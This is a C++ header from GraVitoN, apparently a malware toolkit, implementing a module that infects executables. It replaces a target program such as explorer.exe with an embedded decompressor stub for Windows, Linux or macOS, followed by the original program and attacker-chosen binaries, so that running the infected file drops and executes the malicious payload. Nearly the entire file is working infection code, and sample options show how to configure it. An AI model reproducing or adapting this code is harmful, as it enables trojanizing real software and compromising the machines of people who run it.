/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Inject malware to end of an executable file
 *
*/

#ifndef _GVN_SPREAD_ENDOFFILE_HEAD_
#define _GVN_SPREAD_ENDOFFILE_HEAD_

#include "../../gvn_utils/gvn_files.hpp"
#include "../gvn_spread.hpp"
#include <cstdio>
#include <vector>
#include <cstdlib>
#include <string>
#include <cstring>
#include <sstream>

#include "gvn_spread_endoffile_decom_win32.hpp"
#include "gvn_spread_endoffile_decom_linux64.hpp"
#include "gvn_spread_endoffile_decom_osx32.hpp"

using namespace std;

int SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE = 256;
unsigned char *SPREAD_ENDOFFILE_EOF_SIGNATURE;

void generateSignature()
{
    SPREAD_ENDOFFILE_EOF_SIGNATURE = new unsigned char[SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE];
    unsigned char sig = 0xCE;
    for ( int i=0; i<SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE; ++i )
    {
        SPREAD_ENDOFFILE_EOF_SIGNATURE[i] = sig;

        /// 79 is a prime number!
        sig = ( ~sig % 79 + ( sig << 8 ) % 79 + ( sig >> 8 ) % 79 ) % 0xFF;
    }
}


/**
 * @brief Inject malware to end of an executable file
 *
 * This class takes a malicious executable file and pushes its content at the end of
 * another executable file.
 * after victim runs the infected file the malicious file will be extracted and executed.
 *
 * @note
 * Options (sample): \n
 * Decom=Win32
 * Target=explorer.exe
 * DecTarget=infected_explorer.exe
 * DecTargetPath='C:\windows\'
 * NumFiles=3
 * File1=graviton.exe
 * DecFile1=graviton.exe
 * DecFilePath1='C:\windows\'
 * IsExec1=true
 * File2=graviton_linux
 * DecFile2=graviton_linux
 * DecFilePath2='C:\windows\'
 * IsExec1=false
 * File3=graviton_osx
 * DecFile3=graviton_osx
 * DecFilePath3='C:\windows\'
 * IsExec1=false
 *
 * wrong options:
 * Do Not Forget Last '\': DecFilePath1=[C:\windows\]
 */

class Spread_EndOfFile : public GraVitoN::Spread
{
protected:
    unsigned char *decom;
    unsigned int decom_size;

    string target;
    string dec_targ;
    string dec_targ_path;

    vector<string> file_path;
    vector<string> dec_name;
    vector<string> dec_path;
    vector<bool>   is_exec;

    virtual bool addFile ( const string &file_address,
                           const string &deccom_address,
                           const string &extract_name,
                           const string &extract_path,
                           const bool   &execute );

    virtual bool _InjectFile ( const unsigned char *content,
                               const unsigned int &size,
                               const string &decom_address,
                               const string &extract_name,
                               const string &extract_path,
                               const bool   &execute );

public:
    Spread_EndOfFile();
    virtual ~Spread_EndOfFile();

    virtual bool initialize ( const string &_options = "" );
    virtual bool run();
};

Spread_EndOfFile::Spread_EndOfFile()
{
    generateSignature();
}

Spread_EndOfFile::~Spread_EndOfFile()
{
}

bool Spread_EndOfFile::initialize ( const string &_options )
{
    options = _options;
    file_path.clear();
    dec_name.clear();
    dec_path.clear();
    is_exec.clear();

    decom = _null_;
    string sval;
    bool bval;
    int ival;
    if ( !GraVitoN::OptParser::getValueAsString ( options, "Decom", sval, true ) )
    {
        return false;
    }
    GraVitoN::Logger::logVariable ( "Decom", sval );

    if ( sval == "win32" )
    {
        decom = ( unsigned char* ) DECOM_EOF_WIN32;
        decom_size = DECOM_EOF_WIN32_SIZE;
    }
    else if ( sval == "osx32" )
    {
        decom = ( unsigned char* ) DECOM_EOF_OSX32;
        decom_size = DECOM_EOF_OSX32_SIZE;
    }
    else if ( sval == "linux64" )
    {
        decom = ( unsigned char* ) DECOM_EOF_LINUX64;
        decom_size = DECOM_EOF_LINUX64_SIZE;
    }
    else
    {
        return false;
    }

    if ( !GraVitoN::OptParser::getValueAsString ( options, "Target", target ) )
    {
        return false;
    }
    GraVitoN::Logger::logVariable ( "Target", target );

    if ( !GraVitoN::OptParser::getValueAsString ( options, "DecTarget", dec_targ ) )
    {
        return false;
    }
    GraVitoN::Logger::logVariable ( "DecTarget", dec_targ );

    if ( !GraVitoN::OptParser::getValueAsString ( options, "DecTargetPath", dec_targ_path ) )
    {
        return false;
    }
    GraVitoN::Logger::logVariable ( "DecTargetPath", dec_targ_path );

    if ( !GraVitoN::OptParser::getValueAsInt ( options, "NumFiles", ival ) )
    {
        return false;
    }
    GraVitoN::Logger::logVariable ( "NumFiles", ival );

    for ( int i=1; i<=ival; ++i )
    {
        string entity, si;
        stringstream ssi;
        ssi<<i<<endl;
        ssi>>si;

        entity = "File";
        entity = entity + si;
        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
        {
            return false;
        }
        file_path.push_back ( sval );
        GraVitoN::Logger::logVariable ( entity, sval );

        entity = "DecFile";
        entity = entity + si;
        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
        {
            return false;
        }
        dec_name.push_back ( sval );
        GraVitoN::Logger::logVariable ( entity, sval );

        entity = "DecFilePath" + si;
        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
        {
            return false;
        }
        dec_path.push_back ( sval );
        GraVitoN::Logger::logVariable ( entity, sval );

        entity = "IsExec";
        entity = entity + si;
        if ( !GraVitoN::OptParser::getValueAsBool ( options, entity, bval ) )
        {
            return false;
        }
        is_exec.push_back ( bval );
        GraVitoN::Logger::logVariable ( entity, bval );
    }

    return true;
}

bool Spread_EndOfFile::_InjectFile ( const unsigned char *content,
                                    const unsigned int &size,
                                    const string &decom_address,
                                    const string &extract_name,
                                    const string &extract_path,
                                    const bool   &execute )
{
    unsigned char ctmp[2], dtmp[4];
    unsigned long itmp = 0;

    if ( size == 0 && content == NULL )
    {
        return true;
    }

    /// Add filename size
    itmp = 0;
    cout<<"Name: "<<extract_name<<", Size: "<<extract_name.size() <<endl;
    memcpy ( ctmp, & ( itmp = extract_name.size() ), 2 ); ///< Size of graviton name
    GraVitoN::File::saveUChars ( decom_address, ctmp, 2, true );

    /// Add File Name
    GraVitoN::File::saveUChars ( decom_address, ( unsigned char * ) extract_name.c_str(), extract_name.size(), true );

    /// Add extraction path size
    cout<<"ExtPath: "<<extract_path<<", Size: "<<extract_path.size() <<endl;
    memcpy ( ctmp, & ( itmp = extract_path.size() ), 2 ); ///< Size of extraction path
    GraVitoN::File::saveUChars ( decom_address, ctmp, 2, true );

    /// Add Extract Path
    GraVitoN::File::saveUChars ( decom_address, ( unsigned char * ) extract_path.c_str(), extract_path.size(), true );

    /// Set execution flag
    itmp = ( execute ) ?1:0;
    memcpy ( ctmp, &itmp, 1 );
    GraVitoN::File::saveUChars ( decom_address, ctmp, 1, true );

    cout<<"File Size: "<<size<<endl;
    memcpy ( dtmp, &size, 4 ); ///< Size of file
    GraVitoN::File::saveUChars ( decom_address, dtmp, 4, true );

    GraVitoN::File::saveUChars ( decom_address, content, size, true ); ///< Add File

    return true;
}

bool Spread_EndOfFile::addFile ( const string &decom_address,
								const string &file_address,     
                                const string &extract_name,
                                const string &extract_path,
                                const bool   &execute )
{
    unsigned char *content = _null_;
    unsigned long size = GraVitoN::File::loadFile ( file_address, &content );

    if ( size == 0 && content == NULL )
    {
        return false;
    }

    return _InjectFile ( content, size, decom_address, extract_name, extract_path, execute );
}

bool Spread_EndOfFile::run()
{
    unsigned char ctmp[2];
    unsigned long itmp = 0;

    unsigned char *content = _null_;
    unsigned long size = GraVitoN::File::loadFile ( target, &content );

    /// Extract Decompressor Payload
    GraVitoN::File::saveUChars ( target, decom, decom_size );

    /// Add sign1ature
    GraVitoN::File::saveUChars ( target, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true );

    /// Add number of files
    itmp = file_path.size() + 1;
    memcpy ( ctmp, &itmp, 2 );
    GraVitoN::File::saveUChars ( target, ctmp, 2, true );

    /// Add attributes
    if ( !_InjectFile ( content, size, target, dec_targ, dec_targ_path, true ) )
    {
        return false;
    }
    for ( int i=file_path.size()-1; i>=0; --i )
        if ( !addFile ( target, file_path[i], dec_name[i], dec_path[i], is_exec[i]) )
        {
            return false;
        }

    return true;

    /*
    // OSX32 TEST
    const string decom_addr = "decom";

    unsigned char ctmp[2];
    unsigned long itmp = 0;

    /// Extract Decompressor Payload
    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_OSX32, DECOM_EOF_OSX32_SIZE);

    /// Add sign1ature
    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);

    /// Add number of files
    itmp = 2;
    memcpy(ctmp, &itmp, 2);
    GraVitoN::File::saveUChars(decom_addr, ctmp, 2, true);

    /// Add attributes
    /// A: GraVitoN
    addFile("graviton", decom_addr, "graviton", "", true);
    /// B: Target
    addFile("target", decom_addr, "target", "", true);

    return true;
    */

    /*
    // LINUX TEST
    const string decom_addr = "decom";

    unsigned char ctmp[2];
    unsigned long itmp = 0;

    /// Extract Decompressor Payload
    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_LINUX64, DECOM_EOF_LINUX64_SIZE);

    /// Add sign1ature
    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);

    /// Add number of files
    itmp = 2;
    memcpy(ctmp, &itmp, 2);
    GraVitoN::File::saveUChars(decom_addr, ctmp, 2, true);

    /// Add attributes
    /// A: GraVitoN
    addFile("graviton", decom_addr, "graviton", "", true);
    /// B: Target
    addFile("target", decom_addr, "target", "", true);

    return true;
    */

    /*
    // WINDOWS TEST
    const string decom_addr = "decom.exe";

    unsigned char ctmp[2];
    unsigned long itmp = 0;
    /// Extract Decompressor Payload
    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_WIN32, DECOM_EOF_WIN32_SIZE);
    /// Add sign1ature
    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);
    /// Add number of files
    itmp = 2;
    memcpy(ctmp, &itmp, 2);
    GraVitoN::File::saveUChars(decom_addr, ctmp, 2, true);

    /// Add attributes
    /// A: GraVitoN
    addFile("graviton.exe", decom_addr, "graviton.exe", "", true);
    /// B: Target
    addFile("target.exe", decom_addr, "target.exe", "", true);

    return true;
    */
}

#endif // _GVN_SPREAD_ENDOFFILE_HEAD_
